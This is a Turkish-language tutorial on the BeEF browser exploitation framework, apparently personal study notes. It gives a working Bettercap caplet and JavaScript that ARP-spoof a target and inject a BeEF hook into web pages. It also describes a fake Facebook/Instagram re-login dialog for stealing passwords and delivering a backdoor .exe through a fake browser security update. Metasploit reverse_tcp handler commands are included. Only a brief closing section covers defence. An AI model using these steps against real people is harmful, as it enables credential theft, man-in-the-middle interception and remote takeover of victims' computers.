# Beef

BeeF, bir kullanıcının web tarayıcısını hedef alarak kontrol etmeyi amaçlayan bir penetration testing aracıdır.

Nasıl çalışır?

- Kurban bir zararlı JavaScript kodu içeren sayfayı açar
- Tarayıcı bu kodu çalıştırır
- Tarayıcı saldırganın BeEF paneline bağlanır (hook olur)
- Saldırgan tarayıcı üzerinden bazı işlemler yapabilir

- Beef açılır yeni şifre oluşturulur ve arayüz açılır
- Terminalde js hook kodu verilir.
- Yönetim panelinin sol bölümünde, hook edilmiş istemciler “online browser” olarak listelenir ve bu sistemler üzerinde kontrollü test işlemleri gerçekleştirilebilir.

## Hedefi Oltaya Takmak

- Ağ içi tarayıcı tabanlı güvenlik testlerinin gerçekleştirilebilmesi için, test ortamında basit bir web uygulaması oluşturulur.
- Oluşturulan bu web sayfasına, BeEF tarafından sağlanan JavaScript hook kodu entegre edilir.
- Test ortamını simüle etmek amacıyla, Kali Linux üzerinde yerel bir web sunucusu başlatılır:
  > services apache2 start
- Beef açıldığında terminalde verilen <script src="http://127.0.0.1:3000/hook.js"></script> kodunu test ortamındaki makinenin yerel IP adresi ile güncellenerek hazırlanan web sayfasına eklenir.

## JS Enjeksiyonu

- Ortadaki adam saldırı ile js enjeksiyonu ile kurbanın girdiği web site önemsiz hacklenebilir.

- Bettercap kullanılır. Caplet oluşturulur. OLuşturulmuş caplet kullanılır.

* Caplet : Bettercap içinde caplet, belirli komutları otomatik çalıştıran script dosyasıdır. Yani Bettercap’i her seferinde tek tek komut yazmadan çalıştırmanı sağlar.

//

> > beefcustom.cap

> set arp.spoof.fullduplex true
> set arp.spoof.targets 10.0.2.4 //hedef ip girilir
> set http.proxy.script beefcustom.js
> http.proxy on
> sleep 1
> arp.spoof on
> ""

//

//

> > beefcustom.js

function onLoad() {
log( "BeefInject loaded." );
}

function onResponse(req, res) {
if( res.ContentType.indexOf('text/html') == 0 ){
var body = res.ReadBody();
if( body.indexOf('</head>') != -1 ) {
log( "BeefInject loaded." );
res.Body = body.replace(
'</head>',
'<script type="text/javascript" src="http://10.0.2.8:3000/hook.js"></script></head>'
);
}
}
}

//

- Bu dosyalar /usr/share/bettercap/caplets altına klasör halinde yapıştır bu iki dosyayı. Klasöre beefcustom ismi verilir (opsiyonel)

> bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/beefcustom/beefcustom.cap //tüm işlemleri kendi yapar. Test ortamında kullanıcı bir web sayfasını HTTP üzerinden ziyaret ettiğinde, tarayıcı oturumu BeEF paneline yönlendirilir ve sistem “online browser” olarak yönetim arayüzünde görünür.

- Aktif tarayıcı seçildiğinde, sistemin desteklediği çeşitli test ve demo amaçlı komut modülleri “commands” paneli altında listelenir. Bu modüller, tarayıcı üzerinde gerçekleştirilebilecek yetenekleri simüle eder.

- “Spyder Eye” (ekran izleme / snapshot modülü) seçildiğinde ve çalıştırıldığında, hedef istemcinin tarayıcı oturumundan anlık ekran görüntüsü alınabilir.

## Sosyal Medya Şifreleri Nasıl Çalınır

- Commands kısmında Pretty Thef kısmı açılır. Dialog Type:Facebook,Insta... ,
  Backing: Grey , Logo : Logo girilir inandırıcılık için

- Kurbanın tarayıcısında küçük arayüz açılır. Facebook,instagram tekrar giriş yapın tarzı. Kurban bilgilerini girerse şifre eposta alınır

## Backdoor İletme Yöntemi

- Beef ile Tarayıcıdan backdoor göndererek kurabının bilgisayarı ele geçirilir

- Backdoor oluşturulur
- Kali Web haline getirilir. Kali web klasörüne backdoor yerleştirilir. Backdoor bir web servisten indirilecektir.

> service apache2 start

- Beef'ten "Fake Notification Bar (crome)" açılır. Url: kısmına kali web .exe urlsi girilir. Url: "http:/10.2.0/backdoor/plugin.exe" , Notification Text:"Tarayıcı güvenlik güncellemesi yapınız."

> msfconsole
> use exploit/multi/handler
> msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp // Oluşturulan backdoor bilgileri
> msf6 exploit(multi/handler) > show options
> msf6 exploit(multi/handler) > set LHOST 192.168.64.2
> msf6 exploit(multi/handler) > set LPORT 8080
> msf6 exploit(multi/handler) > exploit -j -z
> msf6 exploit(multi/handler) > session -l
> msf6 exploit(multi/handler) > session -1

## Kendimizi Nasıl Koruruz

- Trayıcıdan veya herhangi biri tarafından gelen/indirilen dosyaları sağ tik>isim değiştir yapılıp right to left chacter override var mı bakabiliriz

- Dosyaya sağ tik> özellikler' den dosya tipi incelenir .exe olup olmadığı kontrol edilebilir.

- arp -a ile aynı mac adresine sahip iki cihaz var mı bakılır.
